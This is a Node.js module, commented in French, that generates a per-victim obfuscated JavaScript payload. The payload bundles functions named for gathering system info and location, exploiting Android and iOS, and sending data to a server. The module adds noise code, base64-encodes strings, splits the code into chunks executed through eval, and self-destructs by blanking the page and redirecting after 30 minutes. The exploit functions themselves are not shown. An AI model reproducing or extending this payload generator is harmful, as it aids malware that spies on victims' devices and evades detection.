const crypto = require('crypto');

class Mutation {
    
    static obfuscationTechniques = [
        'string_split',
        'array_join',
        'eval_encoding',
        'function_factory',
        'regex_obfuscation'
    ];
    
    static generate(victim) {
        // Générer un payload unique
        const payload = `
            (function() {
                const id = '${victim.id}';
                const server = '${process.env.DOMAIN}';
                
                ${this.generateObfuscatedCode(victim)}
                
                // Auto-destruction après 30 minutes
                setTimeout(() => {
                    document.body.innerHTML = '';
                    window.location.href = 'https://www.google.com';
                }, 1800000);
            })();
        `;
        
        return payload;
    }
    
    static generateObfuscatedCode(victim) {
        // Générer du code obfusqué unique
        const functions = [
            this.getSystemInfo,
            this.getLocation,
            this.exploitAndroid,
            this.exploitIOS,
            this.sendData
        ];
        
        let code = '';
        functions.forEach(f => {
            code += f.toString() + '\n';
        });
        
        // Ajouter de la complexité
        code = this.addNoise(code);
        code = this.encryptStrings(code);
        code = this.splitCode(code);
        
        return code;
    }
    
    static addNoise(code) {
        // Ajouter des instructions inutiles
        const noise = [
            'var x = 0; for(var i=0;i<100;i++){x+=i;}',
            'console.log("debug");',
            'if(false){alert("test");}',
            'function dummy(){return null;}'
        ];
        
        return noise.join('\n') + '\n' + code;
    }
    
    static encryptStrings(code) {
        // Chiffrer les chaînes sensibles
        return code.replace(/"([^"]+)"/g, (match, p1) => {
            const encrypted = Buffer.from(p1).toString('base64');
            return `atob("${encrypted}")`;
        });
    }
    
    static splitCode(code) {
        // Diviser le code en morceaux
        const chunks = [];
        for (let i = 0; i < code.length; i += 100) {
            chunks.push(code.substring(i, i + 100));
        }
        
        return `
            var parts = ${JSON.stringify(chunks)};
            var code = parts.join('');
            eval(code);
        `;
    }
}

module.exports = Mutation;
